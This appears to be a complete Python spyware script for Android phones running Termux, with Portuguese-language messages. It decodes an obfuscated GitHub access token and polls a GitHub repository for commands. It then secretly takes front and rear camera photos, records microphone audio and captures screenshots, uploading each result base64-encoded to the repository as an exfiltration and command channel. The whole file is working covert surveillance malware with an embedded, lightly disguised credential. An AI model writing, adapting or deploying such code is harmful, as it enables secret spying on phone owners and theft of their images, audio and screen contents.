import os, json, time, subprocess, requests, base64, random, string
from datetime import datetime

def dec(t):
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    return r

TOKEN = dec("now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da")
REPO = "gynbetfc/eyelive"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Accept": "application/vnd.github.v3+json"}
CONFIG = "/data/data/com.termux/files/home/.eyelive_key"
MEDIA = "/data/data/com.termux/files/home/eyelive_media"
os.makedirs(MEDIA, exist_ok=True)

if os.path.exists(CONFIG):
    with open(CONFIG) as f: KEY = f.read().strip()
else:
    KEY = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
    with open(CONFIG, 'w') as f: f.write(KEY)

print(f"SPY - {KEY}")

def salvar(nome, conteudo):
    try:
        fn = f"dados/{KEY}/{nome}"
        url = f"https://api.github.com/repos/{REPO}/contents/{fn}"
        encoded = base64.b64encode(conteudo.encode() if isinstance(conteudo, str) else conteudo).decode()
        r = requests.get(url, headers=HEADERS)
        p = {"message":"Up","content":encoded,"branch":"main"}
        if r.status_code == 200: p["sha"] = r.json()["sha"]
        requests.put(url, json=p, headers=HEADERS)
    except Exception as e:
        print(f"Erro salvar: {e}")

def status():
    try:
        b = subprocess.check_output("termux-battery-status", shell=True, text=True, timeout=5)
        bat = str(json.loads(b).get("percentage","?")) + "%"
    except: bat = ""
    return json.dumps({"time": datetime.now().strftime("%H:%M:%S"), "bateria": bat, "key": KEY})

def foto(cam=0):
    path = f"{MEDIA}/foto.jpg"
    try:
        subprocess.call(f"termux-camera-photo -c {cam} {path}", shell=True, timeout=10)
        time.sleep(2)
        if os.path.exists(path) and os.path.getsize(path) > 100:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
    except Exception as e:
        print(f"Erro foto: {e}")
    return ""

def audio():
    path = f"{MEDIA}/audio.aac"
    try:
        subprocess.call(f"termux-microphone-record -f {path} -l 10", shell=True, timeout=15)
        time.sleep(12)
        if os.path.exists(path) and os.path.getsize(path) > 100:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
    except Exception as e:
        print(f"Erro audio: {e}")
    return ""

def screenshot():
    path = f"{MEDIA}/screen.png"
    try:
        subprocess.call(f"screencap {path}", shell=True, timeout=10)
        time.sleep(2)
        if os.path.exists(path) and os.path.getsize(path) > 100:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
    except Exception as e:
        print(f"Erro screen: {e}")
    return ""

while True:
    try:
        url = f"https://api.github.com/repos/{REPO}/contents/comandos/{KEY}.json"
        r = requests.get(url, headers=HEADERS)
        if r.status_code == 200:
            data = r.json()
            cmd = json.loads(base64.b64decode(data['content']).decode()).get("cmd","")
            print(f"⚡ {cmd}")
            res = ""
            if cmd == "foto_frontal": res = foto(0)
            elif cmd == "foto_traseira": res = foto(1)
            elif cmd == "audio": res = audio()
            elif cmd == "screenshot": res = screenshot()
            elif cmd == "status": res = status()
            print(f"   Resultado: {len(res)} chars")
            salvar(f"r_{datetime.now().strftime('%H%M%S')}.json", json.dumps({"cmd":cmd,"result":res}))
            requests.delete(url, json={"message":"OK","sha":data['sha'],"branch":"main"}, headers=HEADERS)
        salvar("status.json", status())
    except Exception as e:
        print(f"Loop: {e}")
    time.sleep(5)
